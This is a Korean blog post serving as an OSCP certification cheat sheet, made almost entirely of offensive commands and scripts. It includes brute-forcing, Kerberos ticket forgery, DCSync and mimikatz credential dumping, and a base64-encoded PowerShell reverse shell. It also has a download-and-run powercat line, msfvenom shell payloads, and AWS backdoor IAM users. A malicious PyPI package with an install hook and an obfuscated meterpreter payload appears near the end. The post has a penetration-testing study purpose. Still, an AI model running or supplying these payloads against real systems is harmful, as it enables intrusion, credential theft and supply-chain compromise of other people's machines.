---
layout: post
title: OSCP
subtitle: OSCP 자격증 시험 준비를 위한 정리
author: g3rm
categories: Certificate
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - OSCP
  - Kali_Linux
  - Offsec
sidebar:
---
## Flow
기본적으로 [정보 수집 > 취약점 스캔 > 권한 상승 > 다른 머신 침투] 의 틀을 가지고 있다.   
> 주로 Nmap 및 자동화 툴선에서 끝나는 것 같지만, 수동 정보 수집도 중요하니 막힐 땐 최대한 정보를 모아야 한다.   

## CheatSheet
OSCP 자격증 공부를 하면서 자주 사용하는 명령어 정리
### Scan
#### Port Scan
> masscan, RustScan 도 고려해볼 것   

[Nmap 옵션 정리](https://hagsig.tistory.com/94)   
```shell
# 스캔할 IP 방화벽 인/아웃바운드 열기 및 조회
sudo iptables -I INPUT 1 -s <IP> -j ACCEPT
sudo iptables -I OUTPUT 1 -d <IP> -j ACCEPT
sudo iptables -Z
```

``` shell
# TCP
nmap -sC -sV -Pn <IP> -p <PORT> -oN <저장할 파일명>

# UDP 
nmap -sC -sV -U -Pn <IP> -p <PORT> -oN <저장할 파일명>

# NSE 사용 : /usr/share/nmap/scripts
nmap ~~~ --script <script명>

# In Window
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

### DNS Enum
```shell
# IP 찾기
host <domain>

# A레코드 검색
host -t mx <domain>
nslookup mail.megacorptwo.com # in Window

# TXT레코드 검색
host -t txt <domain>
nslookup -type=TXT <domain> <DNS_IP> # in Window

# subdomain 검색 : /usr/share/seclists 
# 없을경우 sudo apt install seclists
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
for ip in $(seq 200 254); do host 000.000.000.$ip; done | grep -v "not found"

# dnsrecon / options : std, brt
dnsrecon -d <domain> -t <options> -D <wordlist>
```

### SMB Enum
```shell
# NetBIOS + SMB : 옛날 버전
sudo nbtscan -r 192.168.50.0/24

# 디스크 확인
smbclient //<ip>/<Folder 명>
net view \\<AD_domain> /all # in Window
```
### SMTP Enum
```shell
# user 확인
nc -nv <ip> 25
```

``` python
# smtp.py : python3 smtp.py <user명> <IP>
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
        print("Usage: vrfy.py <username> <target_ip>")
        sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)

print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)

print(result)

# Close the socket
s.close()
```

```powershell
# in Window
Test-NetConnection -Port 25 <ip>

# telnet : admin 권한 필요
dism /online /Enable-Feature /FeatureName:TelnetClient
telnet <IP> 25
```

### SNMP Enum
| MIB                    |           |
| ---------------------- | --------- |
| 1.3.6.1.2.1.25.1.6.0   | 시스템 프로세스  |
| 1.3.6.1.2.1.25.4.2.1.2 | 프로그램 실행   |
| 1.3.6.1.2.1.25.4.2.1.4 | 프로세스 경로   |
| 1.3.6.1.2.1.25.2.3.1.4 | 보관 유닛     |
| 1.3.6.1.2.1.25.6.3.1.2 | 소프트웨어 이름  |
| 1.3.6.1.4.1.77.1.2.25  | 사용자 계정    |
| 1.3.6.1.2.1.6.13.1.3   | TCP 로컬 포트 |
   
```shell
# list 구성
echo "public\nprivate\nmanager" > community
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips

# onesixtyone
onesixtyone -c community -i ips

# snmpwalk
snmpwalk -c public -v1 -t 10 <IP> <MIB_Num>
```

### WEB
#### Gobuster
```shell
# /usr/share/wordlists/dirb, SecLists/
# pattern 양식 : {GOBUSTER}/v1
gobuster dir -u <ip> -w <word_list> -p <pattern>
```
#### XSS
공격 코드 한줄요약
[JS Compress](https://jscompress.com/)

#### Command Injection
```
# Window 일때, cmd, PowerShell 구분 / PetSerAl 검색
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

# ps1 다운 후 실행
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.000.000/powercat.ps1");powercat -c 192.168.000.000 -p 4444 -e powershell
```

### Password
사용할 워드리스트 위치 :  `/usr/share/wordlists/`

#### Wordlist 변형
각종 rule 위치 : `/usr/share/hashcat/rules/`
```shell
# 특정 앞자리 제거
sed -i '/^1/d' password.txt

# 규칙들 (한줄로 작성 시 한번에 적용 / 여러줄로 작성 시 각각 적용)
$1 -> 뒤에 1 추가 / c -> 앞문자 대문자로


# 규칙 생성 및 적용
echo \$1 > password.rule
hashcat -r demo.rule --stdout password.txt
```
#### hydra
```shell
# user명 알때
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<ip>

# password 알때
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "password" rdp://<ip>

# HTTP Post
hydra -L <users_file> -P <password_file> <url> http[s]-[post|get]-form \
"index.php:param1=value1&param2=value2&user=^USER^&pwd=^PASS^&paramn=valn:[F|S]=messageshowed"
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.000.000 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

```

#### NTLM
#### HashCat

### Window
#### Info Gather
```Powershell
# KeePass Password
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue


```
#### Binary Hijacking
#### DLL Hijacking
#### Incorrect Path

### Linux
#### Info Gather
#### Cron Jobs Abuse
#### Setuid Abuse
#### Sudo Abuse

#### Kernel Vuln Use

### Port Forwarding & Tunneling
#### Port Forwarding

#### SSH Tunneling
#### HTTP Tunneling
#### DNS Tunneling

### Active Directory

#### 정보 수집
```powershell
# domain 사용자 출력
net user /domain
net user <username> /domain

# domain group 출력
net group /domain
net group <groupname> /domain

# current domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name # 속성 추출

# DN 검색
([adsi]'').distinguishedName
```

##### .NET 클래스 이용
```ps1
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()
}
```

```Powershell
# 모든 그룹 나열
LDAPSearch -LDAPQuery "(objectclass=group)"

# 특정 그룹 검색
$test = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Test LDAP))"
$test.properties.member
```

##### PowerView 이용
```Powershell
Import-Module .\PowerView.ps1

# 오류 메시지 받기
-Verbose

# 도메인
Get-NetDomain

# 유저
Get-NetUser | select <속성>

# 그룹
Get-NetGroup <그룹> | select <속성>

# 도메인 컨트롤러 정보 확인
Get-NetDomainController

# 도메인 정책 확인
Get-DomainPolicy

# 시스템 권한 확인
(Get-DomainPolicy)."system access"

# 컴퓨터 열거
Get-NetComputer | select operatingsystem,dnshostname

# 해당 유저의 관리자 권한 컴퓨터 찾기
Find-LocalAdminAccess

# 세션 찾기 권한 확인 및 찾기
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-NetSession -ComputerName <컴퓨터이름>
## 권한이 없을 경우 + Remote Registry 켜져있을 때 사용
.\PsLoggedon.exe \\<컴퓨터이름> 

# 계정에 연결된 SPN 확인
setspn -L <계정명>
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# 유저 권한 확인
Get-ObjectAcl -Identity <계정명>

# SID 변환
Convert-SidToName <SID>
<SID1>,<SID2> | Convert-SidToName

# GenericAll 권한인 유저들 출력
Get-ObjectAcl -Identity <그룹> | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# 도메인 공유 출력
Find-DomainShare
```

##### BloodHound
```powershell
# SharpHound로 분석할 데이터 만들기
# 사용법
Get-Help Invoke-BloodHound

# 전체 조사
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\<경로> -OutputPrefix <zip파일 접두사>

# BloodHound 환경설정
# default account - neo4j:neo4j
sudo apt install bloodhound
sudo neo4j start
bloodhound

```

#### Auth Attack
```powershell
# mimikatz로 우선 해쉬 얻어야함 / 
privilege::debug
sekurlsa::logonpasswords
# dir \\web04.corp.com\backup 사용 시 티켓이 생성되며 캐시되어 얻을 수 있음
sekurlsa::tickets
# 정책 가져오기
net accounts

# Password Spray 3가지 기법
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
crackmapexec smb 192.168.50.0/24 -u users.txt -p <password> -d <domain> --continue-on-success
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

AS-REP Roasting
```powershell
# Kerberos의 사전 인증을 비활성하여 모든 AD 사용자에 대해서 AS-REQ를 날리기
impacket-GetNPUsers -dc-ip <ip>  -request -outputfile hashes.asreproast corp.com/pete

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Rubeus.exe 이용
.\Rubeus.exe asreproast /nowrap

```

Kerber Roasting
```powershell
# kali
sudo impacket-GetUserSPNs -request -dc-ip <ip> corp.com/pete

# Rubeus.exe 이용
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Silver Ticket
```powershell
# 우선 mimi로 NTLM 해쉬 획득 / domain sid 만 획득 - 현재계정 sid에서 마지막만 빼면 됨.
4d28cf5252d39971419580a51484ca09
S-1-5-21-1987370270-658905905-1781884369

# 위조 티켓 생성
kerberos::golden /sid:S-1-5-21-0-0-0 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:NTLM_Hash /user:username

# 캐쉬된 티켓 확인
klist
```

Golden Ticket
```powershell
# Silver Ticket처럼 해쉬값 얻기
# 기존 티켓 삭제
kerberos::purge

# 티켓 생성
kerberos::golden /user:<생성할 유저명 아무거나> /domain:corp.com /sid:S-1-5-21-0-0-0 /krbtgt:NTLM_Hash /ptt
```

Domain Sync
```powershell
# in mimi
lsadump::dcsync /user:corp\dave

# in kali
impacket-secretsdump -just-dc-user <find_user> domain/user:password@dc_ip
```

Shadow
```powershell
# vshadow 실행 / Shadow copy device name 컬럼 중요
vshadow.exe -nw -p  C:

# Shadow 복사
copy \\?\<Shadow copy device name>\windows\ntds\ntds.dit c:\ntds.dit.bak
# System hive 복사
reg.exe save hklm\system c:\system.bak

# in kali
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

#### Lateral Move
WMI / WinRM
```python
# encoding.py
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("kali-ip",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
```powershell
# WMI.ps1
$username = '';
$password = '';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName <이동할 AD IP> -Credential $credential -SessionOption $Options 
$Command = 'encoding.py printing value';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
```powershell
# WinRM
$username = '';
$password = '';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <이동할 AD IP> -Credential $credential
```

``` powershell
# WMI - 실행시 kali nc에 붙음
.\WMI.ps1

# WinRM
winrs -r:<이동할 AD hostname : test04> -u:username -p:password  "encoding.py printing value"
.\WinRM.ps1
Enter-PSSession 1
```

PsExec
조건
1. 대상 머신에 인증하는 사용자는 Administrators 로컬 그룹이여야 한다.
2. ADMIN$ 공유를 사용할 수 있어야 한다.
3. 파일 및 프린터 공유를 켜야 한다.
```powershell
# 단순 실행
./PsExec64.exe -i  \\FILES04 -u domain\user -p password cmd
```

Pass The Hash
조건
1. NTLM 인증을 사용하는 서비스만 가능
2. SMB 연결 필요
3. 파일 및 프린터 공유를 켜야 한다.
```shell
# in Kali
/usr/bin/impacket-wmiexec -hashes :<NTLM Hash Value> Administrator@IP
```

Overpass The Hash
```powershell
# NTLM 해시를 이용하여 Kerberos Ticket으로 변경하는 과정
# mimikatz 쉘 생성
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

# Kerberos Ticket Create / 도메인 권한이 필요한 명령을 아무거나 실행하면 티켓 생성됨.
net use \\<AD-hostname>

# 생성된 Kerberos 티켓 재사용
.\PsExec.exe \\<AD-hostname> cmd
```

Pass The Ticket
```powershell
# TGT/TGS 내보내기 및 검색
sekurlsa::tickets /export
dir *.kirbi

# TGS Ticket 주입
kerberos::ptt <Ticket_File_name>.kirbi
```

DCOM
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","ip"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"encoding.py printing value","7")
```

### Metasploit
#### msfconsole
Nmap 및 공격 성공 시 얻는 세션 등 다양한 것들을 공유하여 사용할 수 있어 초기화 및 워크스페이스 생성 후 사용하는 것이 좋다.   
자동화 코드 위치 : /usr/share/metasploit-framework/scripts/resource   

```Shell
# 초기화 및 접속
sudo msfdb (re)init
sudo systemctl enable postgresql
sudo msfconsole -r <자동화 스크립트>

# 워크스페이스 생성
workspace -a pen200

# Nmap 사용
db_nmap <기존 Nmap 옵션>
hosts
services

# 보조모듈 나열 exploits, payloads, auxiliary 등등 있음
show -h

# 검색
search type:<보조모듈> <검색어>
search type:auxiliary ssh
search Apache 2.4.49

# payload 검색
show payloads
set payloads <번호>

# 사용 및 세팅
use <번호>
show options
set <option> <value> / unset <option>
services -p 445 --rhosts # db_name으로 정보가 있다면 사용 가능
run

# 공격 성공하여 얻은 정보/세션들
creds
sessions / sessions -i <번호>

# nc 안될 때, multi/handler 사용
use multi/handler

# route 관련
route add <subnet> <sessionId>
route add 172.16.1.0/24 12

route print
route flush

# 포트포워딩
portfwd add -l 3389 -p 3389 -r 172.16.000.000

# session background
Ctrl+z 
```

#### msfvenom
https://github.com/puckel/Cheatsheets/blob/master/Cheatsheet_MetasploitPayloads.txt 참고   
```shell
# payloads 리스트 출력
msfvenom -l payloads --platform windows --arch x64

# payload 생성
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe

# web reverse shell
msfvenom -p php/reverse_php LHOST=192.168.45.241 LPORT=9999 -f raw -o php_reverse_9999.pHP
cat php_reverse_9999.pHP | pbcopy && echo '<?php ' | tr -d '\n' > php_reverse_9999.pHP && pbpaste >> php_reverse_9999.pHP
```

#### meterpreter
multi/handler 혹은 meterpreter 가 포함된 reverse shell로 공격하여 쉘 얻을 시
``` shell
# shell 얻기
shell

# 기존 명령어 사용
l<linux명령어> / lpwd / lcat ...

# 파일 관련
download <경로>
upload <칼리경로> <피해자경로>

# 유저 얻기
getuid

# 시스템 정보 얻기
sysinfo

# 권한상승 / SeImpersonatePrivilege 권한 필요
getsystem

# 프로세스 보기
ps

# 환경변수 보기
getenv <변수명>

# 리버스 쉘 .exe 프로세스를 특정 프로세스 하위로 마이그레이션
migrate <위장할PID>

# 프로세스 만들기
execute -H -f notepad

# background
bg
```

### AWS
#### S3 Enum
"public", "private", "dev", "prod", "development", "production" 는 자주 사용되는 용어
```shell
# cloud-enum 사용
cloud_enum -k <aws s3 name> --quickscan --disable-azure --disable-gcp
cloud_enum -kf /tmp/keyfile.txt --quickscan --disable-azure --disable-gcp 
```
#### AWS-CLI
```shell
# 자격증명
aws configure --profile attacker
or
vi ~/.aws/credentials
aws_access_key_id=<AccessKeyID>
aws_secret_access_key=<SecretAccessKey>
aws_session_token=<SessionToken>

# 자격증명 테스트 - CloudTrail에 기록이 남음
aws --profile attacker sts get-caller-identity

# ec2 이미지 출력
aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*test*"

# EBS 스냅샷 출력
aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*test*"

# VPC 출력
aws --profile attacker ec2 describe-vpcs

# S3 출력 및 싱크
aws --profile attacker s3 ls <Bucket>
aws --profile attacker s3 cp s3://<버킷 이름>/<파일 경로> /dev/stdout
aws --profile attacker s3 sync s3://staticcontent-sw5h88skyrqng5ba ./s3_sync/

# IAM 생성
aws --profile attacker iam create-user --user-name enum
aws --profile attacker iam create-access-key --user-name enum

# IAM 정책 추가
aws --profile CompromisedJenkins iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# IAM 권한 부여
aws --profile attacker iam put-user-policy \
--user-name enum \
--policy-name s3-read \
--policy-document file://policy-s3-read.json
aws --profile attacker iam list-user-policies --user-name enum

# lambda 함수 ARN 생성 - 권한 부족으로 에러 발생 시 유저 네임을 얻을 수 있다.
aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile

# 유저 인라인 정책 및 관리 정책 출력
aws --profile target iam list-user-policies --user-name clouddesk-plove
aws --profile target iam list-attached-user-policies --user-name clouddesk-plove

# 그룹 인라인 정책 및 관리 정책 출력
aws --profile target iam list-group-policies --group-name support
aws --profile target iam list-attached-group-policies --group-name support

# 정책 버전 및 내용 출력
aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/<policy-name>"
aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/<policy-name> --version-id v1

# 속한 그룹 출력
aws --profile target iam list-groups-for-user --user-name clouddesk-plove

# iam 요약
aws --profile target iam get-account-summary

# iam 나열
aws --profile target iam list-<users/groups/roles>

# 연결된 관리 정책 나열
# list-user-policies, get-user-policy, list-group-policies, get-group-policy, list-role-policies, get-role-policy, list-attached-user-policies, list-attached-group-policies, list-attached-role-policies
aws --profile target iam list-policies --scope Local --only-attached

# IAM 구성 스냅샷
aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy
```

```json
# 권한 부여 예시
# 0* 1* 로 오류 여부를 파악해 블라인드 테스트로 ID값을 얻을 수 있음
{
     "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetObject"
            ],
            "Resource": "*",
            "Condition": {
                "StringLike": {"s3:ResourceAccount": ["0*"]}
            }
        }
    ]
}
```

#### JMESPath
``` shell
# json parsing
aws --profile target iam get-account-authorization-details --filter User Group --query "{Users: UserDetailList[?Path=='/admin/'].UserName, Groups: GroupDetailList[?Path=='/admin/'].{Name: GroupName}}"

```
#### pacu
```shell
# pacu 실행
pacu

# aws profile 주입
import_keys attacker

# 사용 가능 모듈
ls

# 다른 계정 찾기
run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012

# ec2 나열
run ec2__enum
```

### Git
```shell
# .git 폴더 있는 곳에서
# 실행
gitleaks detect

# 로그 보기
git log

# 깃 해시로 보기
git show <hash>
```

### Etc
#### RDP 접근
``` shell
xfreerdp /drive:test,/home/kali/offsec /u:nadine /p:123abc /v:192.168.145.227

# Remote Desktop Users 또는 Remote Management Users  권한 없는 유저 접근 법
runas /user:backupadmin cmd
```
#### SSH 접근
```shell
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" User@IP
```
#### FTP 접근
```shell
# 기본적인 FTP 접근 
ftp <IP> 

# 파일 디렉토리 탐색 
pwd # 현재 작업 디렉토리 표시 
cd <dir_name> # 특정 디렉토리 이동 
ls # 현재 디렉토리 파일 및 폴더 목록 표시 (dir도 가능) 

# 파일 전송 
get <file_name> # 로컬에 파일 다운로드 
mget <file1 file2 ..> # 로컬에 다수 파일 다운로드 
put <file_name> # 서버에 파일 업로드 
mput <file1 file2 ...> # 서버에 다수 파일 업로드 

# 파일 조작 
delete  
```
#### Netcat
```shell
nc -nvlp <port>
nc <ip> <port>
```

#### Python File Download
```shell
# Python server start
python3 -m http.server 80

# Window
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe

# Linux
curl http://192.168.48.3/adduser.exe
```

#### UAC Bypass
무결성이 높음이여야 UAC에 안걸리기에 **sdclt.exe**를 자주 이용하여 우회   
우회 성공 시 kiwi를 사용할 수 있다.   
> OSCP에는 안나올 가능성이 크지만, 그래도 정리   
   
```shell
# 무결성 확인
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel

# msfconsole 이용해서 우회...
search UAC
use exploit/windows/local/bypassuac_sdclt

# kiwi 사용
load kiwi
help
```

#### PIP
```shell
# pip 클라이언트를 구성
mkdir -p ~/.config/pip/
vi ~/.config/pip/pip.conf

[global]
index-url = http://pypi.offseclab.io
trusted-host = pypi.offseclab.io

python -m pip config set global.break-system-packages true
# 다운로드 시도
pip download hackshort-util

# 악성 패키지 생성
mkdir <패키지 명>
cd <패키지 명>
# 설치 스크립트 작성
vi setup.py

from setuptools import setup, find_packages
setup(
    name='<패키지 명>',
    version='1.1.4',
    packages=find_packages(),
    classifiers=[],
    install_requires=[],
    tests_require=[],
)
# Python의 경우 - 처리 불가로 _로 대체하여 폴더 생성
mkdir hackshort_util
touch hackshort_util/__init__.py

# 소스 배포 및 설치
python3 ./setup.py sdist
pip install ./dist/hackshort-util-1.1.4.tar.gz
```
설치 중 명령 실행
```Python
# setup.py
from setuptools import setup, find_packages
from setuptools.command.install import install

class Installer(install):
    def run(self):
        install.run(self)
        with open('/tmp/running_during_install', 'w') as f:
            f.write('This code was executed when the package was installed')

setup(
	name='<패키지 명>',
	version='1.1.4',
	packages=find_packages(),
	classifiers=[],
	install_requires=[],
	tests_require=[],
	cmdclass={'install': Installer}
)
```
런타임 중 명령 실행
```python
# utils.py / __init__.py 있는 곳에서
import time
import sys

def standardFunction():
        pass

def __getattr__(name):
        pass
        return standardFunction

def catch_exception(exc_type, exc_value, tb):
    while True:
        time.sleep(1000)

sys.excepthook = catch_exception

#리버스 쉘 msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST= LPORT=
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LAzEQPW9+RW5JMIZ2G2striDiQaQI1puI7Cajhs0mS5LqWvG/25DiZYb35s2bDzOMPiQcveoh8b01He/aCEvJYwo7lXgyA6A3H/CEjcOhde9A5zO2RlUK34dYxaY0i5JozY94+3Bz/7p9ery93rCsE8o7BypRShaiXlyI+XktJOFSrlYsK7oAbY8qmBSMKVvn2SJagJGeMWSbspLYubFVPSVXd4RHEUB9UsnY8+wF6eaILUNfH8YCtuCoZpf2YKdP/qunhWYIJlA0Xy00KD+MAWKk5QGiW8pMashK/kMiWcdfhv4AjN1e1Q==')[0])))
```
악성 패키지 게시
```shell
# 실제는 공개 Python 패키지 인덱스에 계정 만들어서 하면 됨
# ~/.pypirc
[distutils]
index-servers = offseclab 

[offseclab]
repository: http://pypi.offseclab.io/
username: student
password: password   

# 업로드
python3 setup.py sdist 
pip install twine
twine upload dist/* -r offseclab

# 제거
curl -u "student:password" --form ":action=remove_pkg" --form "name=hackshort-util" --form "version=1.1.4" http://pypi.offseclab.io/
```
#### Local simple port scan
``` python
# netscan.py / python netscan.py <ip>/24
import socket
import ipaddress
import sys

 def port_scan(ip_range, ports):
    for ip in ip_range:
        print(f"Scanning {ip}")
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(.2)
            result = sock.connect_ex((str(ip), port))
            if result == 0:
                print(f"Port {port} is open on {ip}")
            sock.close()

ip_range = ipaddress.IPv4Network(sys.argv[1], strict=False)
ports = [80, 443, 8080]  # List of ports to scan

port_scan(ip_range, ports)
```
